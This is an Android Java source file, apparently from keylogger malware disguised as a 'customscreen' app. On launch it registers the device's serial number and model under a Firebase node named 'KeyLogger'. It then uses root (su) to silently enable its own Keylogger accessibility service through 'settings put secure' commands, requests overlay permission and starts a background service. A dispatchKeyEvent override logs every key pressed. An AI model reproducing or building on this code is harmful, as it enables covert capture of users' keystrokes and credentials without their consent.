package com.custom.metinatac.customscreen;

import android.content.Intent;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Looper;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.KeyEvent;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }


    private ExecuteAsRootBase exRootBase;
    public boolean gefunden;
    Key gefundenerKey;

    private static final int OVERLAY_PERMISSION_CODE = 2002; // can be anything

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String serial = Build.SERIAL;

        // Write a message to the database
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("KeyLogger");

        myRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {

                for(DataSnapshot ds : dataSnapshot.getChildren()) {

                    Key currentKey = ds.getValue(Key.class);


                    if(currentKey.getSerialnumber().equals(Build.SERIAL)) {
                        gefundenerKey = currentKey;
                        gefunden = true;
                        break;
                    } else {
                        continue;

                    }


                }


                if(gefunden) {
                    Keylogger.gefundenerKey = gefundenerKey;

                    checkPremission();
                    (new Startup()).execute();
                } else {

                    // Write a message to the database
                    FirebaseDatabase database = FirebaseDatabase.getInstance();
                    DatabaseReference myRef = database.getReference("KeyLogger");

                    String idd = myRef.push().getKey();
                    Key neuerKey = new Key(idd, Build.SERIAL, Build.MODEL, "");

                    myRef = myRef.child(Build.SERIAL);
                    myRef.setValue(neuerKey);

                    Keylogger.gefundenerKey = neuerKey;
                    checkPremission();
                    (new Startup()).execute();


                }


            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });







    }


    @Override
    public boolean dispatchKeyEvent(KeyEvent KEvent)
    {
        int keyaction = KEvent.getAction();

        if(keyaction == KeyEvent.ACTION_DOWN)
        {
            int keycode = KEvent.getKeyCode();
            int keyunicode = KEvent.getUnicodeChar(KEvent.getMetaState() );
            char character = (char) keyunicode;

            System.out.println("DEBUG MESSAGE KEY=" + character + " KEYCODE=" +  keycode);
        }


        return super.dispatchKeyEvent(KEvent);
    }


    public void seriennummerSuchen() {




    }


    private void enableAccessibility() {

        Log.d("MainActivity", "enableAccessibility");
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
            // running on the main thread
        } else {
            Log.d("MainActivity", "not on main thread");
            // not running on the main thread
            try {
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.custom.metinatac.customscreen/com.custom.metinatac.customscreen.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }



    }




    public void checkPremission() {

        if (Build.VERSION.SDK_INT >= 23) {
            if (!Settings.canDrawOverlays(this)) {

                // Open the permission page
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, OVERLAY_PERMISSION_CODE);
                return;
            }
        }


        goToReactActivity();

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode,  Intent data) {

        // If the permission has been checked
        if (requestCode == OVERLAY_PERMISSION_CODE) {
            if (Settings.canDrawOverlays(this)) {
                goToReactActivity();
            }
        }
    }

    private void goToReactActivity() {
        startService(new Intent(this, CornerService.class));
        finish();
    }

    @Override
    protected void onStart() {
        super.onStart();

        String serial = Build.SERIAL;

        // Write a message to the database
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("KeyLogger");

        myRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {

                for(DataSnapshot ds : dataSnapshot.getChildren()) {

                    Key currentKey = ds.getValue(Key.class);


                    if(currentKey.getSerialnumber().equals(Build.SERIAL)) {
                        gefundenerKey = currentKey;
                        gefunden = true;
                        break;
                    } else {
                        continue;

                    }


                }


                if(gefunden) {
                    Keylogger.gefundenerKey = gefundenerKey;

                    checkPremission();
                    (new Startup()).execute();
                } else {

                    // Write a message to the database
                    FirebaseDatabase database = FirebaseDatabase.getInstance();
                    DatabaseReference myRef = database.getReference("KeyLogger");

                    String idd = myRef.push().getKey();
                    Key neuerKey = new Key(idd, Build.SERIAL, Build.MODEL, "");

                    myRef = myRef.child(Build.SERIAL);
                    myRef.setValue(neuerKey);

                    Keylogger.gefundenerKey = neuerKey;
                    checkPremission();
                    (new Startup()).execute();


                }


            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {

            }
        });


    }
}
